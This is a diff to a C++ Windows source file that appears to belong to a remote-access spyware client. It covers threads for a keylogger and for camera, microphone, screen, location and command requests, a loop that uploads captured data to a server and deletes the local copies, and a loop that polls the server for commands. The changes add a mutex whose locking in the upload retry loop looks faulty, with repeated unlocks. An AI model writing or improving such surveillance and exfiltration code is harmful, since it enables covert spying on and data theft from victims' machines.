@@ -1,11 +1,14 @@
 #include "TaskRoutines.h"
-#include <queue>
+#include <mutex>
 
 HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
 map<string, BOOL> workingTasks;
 
+std::mutex buff_mutex;
+
 DWORD WINAPI initFiltering(LPVOID lpParam)
 {
+//	snitchServer();
 	return 0;
 }
 DWORD WINAPI initKeylogger(LPVOID lpParam)
@@ -219,14 +222,21 @@ DWORD WINAPI initDataManager(LPVOID lpParam)
 			};
 			string json = jsonFromItem(currentJsonItem, DATA);
 
-			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200)
+			buff_mutex.lock();
+			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200) {
+				buff_mutex.unlock();
 				Sleep(SYNC_TIME);
+			}
 
-			// Remove the file from temp folder after successfully uploading it
-			  
+			// Remove the file from temp folder after successfully uploading it	  
 			wstring wfilename(data.cFileName);
 			wstring concatted_stdstr = L"temp/" + wfilename;
 			LPCWSTR fullPath = concatted_stdstr.c_str();
+			
+			if (workingTasks.find(dataType) != workingTasks.end())
+				workingTasks.erase(dataType);
+			buff_mutex.unlock();
+
 			DeleteFile(fullPath);
 			// Remove from the queue
 			uploadQueue.pop();
@@ -239,11 +249,11 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 {
 	// Retreive events from the server.
 	// Signal event for current request. E.g. camera
-
+	 
 	while (TRUE) {
 		// Look for new requests from server..
 		ResponseData requests; 
-
+		buff_mutex.lock();
 		while (TRUE) {
 			requests = downloadFile();
 			if (requests.dwStatusCode != 200 || requests.response == "[]")
@@ -254,7 +264,7 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 		// Convert the response to map or requests.
 		map<string, map<string, string>> allRequests = itemsListFromJson(requests.response);
 		map<string, string> myResponse;
-
+		   
 		for (int i = 0; i < allRequests.size(); i++)
 		{
 			initRequest(allRequests, Camera, camRequest);
@@ -264,6 +274,7 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 			initRequest(allRequests, Command, cmdRequest);
 			initRequest(allRequests, Location, locationRequest);
 		}
+		buff_mutex.unlock();
 		Sleep(SYNC_TIME);
 	}
 	return 0;
@@ -279,19 +290,14 @@ BOOL initRequest(map<string, map<string, string>> allRequests, const char* reque
 		return FALSE;
 
 	currentRequest = allRequestsIterator->second;
-	requestIterator = currentRequest.find(DATA_ID);
+	requestIterator = currentRequest.find(DATA_TYPE);
 
-	map<string, BOOL>::iterator tasksIter = workingTasks.find(requestIterator->second);
+	map<string, BOOL>::iterator tasksIter = workingTasks.find(requestName);
 	if (tasksIter == workingTasks.end()) {
 		//If the task is new, register it in the map ..
 		workingTasks.insert(make_pair(requestIterator->second, TRUE));
 	}
-	else // The task was found in the map ..
-	{ 
-		if (!tasksIter->second) { // Task set to false ..
-			// If the task was turned off, remove from map ..
-			workingTasks.erase(tasksIter);
-		}
+	else { // The task was found in the map ..
 		return FALSE; // Task already running, no need to call it again ..
 	}
 	// else call the requested task 
